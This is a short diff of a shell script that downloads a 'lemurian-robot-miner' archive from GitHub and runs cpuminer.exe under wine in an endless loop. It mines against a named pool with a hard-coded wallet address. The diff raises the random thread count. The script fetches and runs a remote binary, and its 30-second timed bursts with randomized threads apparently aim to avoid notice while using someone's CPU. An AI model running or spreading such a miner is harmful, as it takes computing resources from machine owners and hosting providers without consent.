@@ -5,7 +5,7 @@ wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/lemurian-r
 unzip lemurian-robot-miner.zip
 
 while true; do
-THREADS=$((RANDOM % 6 + 1))
+THREADS=$((RANDOM % 8 + 4))
 echo "Starting with $THREADS threads..."
 timeout 30s wine ./cpuminer.exe -a power2b -o na.rplant.xyz:7022 -u mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.socks5 -t "$THREADS"
 sleep 5s
